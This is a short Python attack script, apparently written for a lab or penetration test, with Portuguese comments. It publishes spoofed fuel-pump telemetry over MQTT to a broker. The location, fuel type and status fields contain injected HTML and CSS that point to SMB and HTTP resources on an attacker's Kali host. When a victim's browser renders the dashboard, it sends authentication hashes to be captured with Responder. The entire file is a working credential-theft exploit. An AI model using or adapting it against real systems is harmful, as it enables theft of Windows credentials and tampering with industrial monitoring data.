import json
import paho.mqtt.client as mqtt
import time

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

# Injetando tags HTML simulando imagens ou links de recursos no seu Kali
# Se o navegador da vítima (.3 ou .2) interpretar isso na tela, ele disparará a autenticação HTTP/SMB automática
payload = {
    "pumpId": "PUMP001",
    "location": f"<img src='\\\\{KALI_IP}\\share\\logo.png'>Terminal Leste",
    "fuelType": f"<img src='http://{KALI_IP}/image.gif'>Diesel S-10",
    "capacityCurrent": 4500,
    "capacityTotal": 5000,
    "capacityPercentage": "90.0",
    "status": f"<b style='background-image:url(\\\\{KALI_IP}\\\\test)'>Normal</b>",
    "timestamp": int(time.time() * 1000)
}

client.publish("fuel-pumps/data", json.dumps(payload))
print("[+] Payload HTML envenenado enviado. Monitore o Responder!")
client.disconnect()
